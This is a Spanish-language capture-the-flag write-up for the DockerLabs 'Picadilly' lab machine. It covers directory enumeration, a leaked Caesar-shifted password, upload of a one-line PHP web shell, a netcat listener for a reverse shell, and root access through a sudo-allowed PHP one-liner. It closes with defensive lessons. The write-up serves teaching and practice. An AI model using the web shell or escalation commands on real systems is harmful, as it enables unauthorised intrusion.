# Picadilly — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** kaikoperez  
**Fecha de creación:** 18/05/2024  
**Técnicas:** Gobuster · File Upload · Reverse Shell · Caesar Cipher · SSH · PHP sudo abuse

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [File Upload — Reverse Shell](#3-file-upload--reverse-shell)
4. [Obtención de credenciales](#4-obtención-de-credenciales)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh picadilly.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
80/tcp open http
443/tcp open https
```

---

## 2. Enumeración web — Gobuster

Enumeramos directorios tanto en HTTP como HTTPS.

HTTP:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt
```

Resultado:

```text
/backup.txt
```

HTTPS:

```bash
gobuster dir -u https://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x txt,php,html,py -k
```

Resultado:

```text
/index.php
/uploads
```

Exploramos `backup.txt`:

```text
The users mateo password is hdvfuadcb
```

También aparece la pista:

```text
To solve this riddle, think of an ancient Roman emperor and his simple method of shifting letters.
```

La pista hace referencia al cifrado César.

---

## 3. File Upload — Reverse Shell

Explorando el servicio HTTPS observamos una funcionalidad de subida de archivos.

Creamos un fichero PHP simple:

```php
<?php
system($_GET["cmd"]);
?>
```

Subimos el archivo y comprobamos ejecución:

```text
https://172.17.0.2/uploads/prueba.php?cmd=id
```

Resultado:

```text
uid=33(www-data)
```

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Generamos una reverse shell PHP/Bash y obtenemos acceso remoto.

Verificamos usuarios:

```bash
ls /home
```

Resultado:

```text
mateo
```

---

## 4. Obtención de credenciales

Desciframos el texto utilizando un descifrador César.

Texto cifrado:

```text
hdvfuadcb
```

Resultado:

```text
easycrazy
```

Cambiamos al usuario:

```bash
su mateo
```

Contraseña:

```text
easycrazy
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/php
```

---

## 5. Escalada de privilegios

Ejecutamos PHP como root utilizando GTFOBins.

Payload:

```bash
CMD='/bin/bash'
sudo /usr/bin/php -r "system('$CMD');"
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información sensible expuesta | Filtración de credenciales |
| Subida insegura de archivos | Ejecución remota de comandos |
| Contraseña débil con cifrado simple | Acceso a usuario |
| PHP ejecutable con sudo | Escalada a root |

**Para defenderse:**

- Restringir subida de archivos ejecutables.
- No almacenar credenciales en texto visible.
- Utilizar contraseñas robustas y cifrados seguros.
- Evitar binarios peligrosos ejecutables mediante sudo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
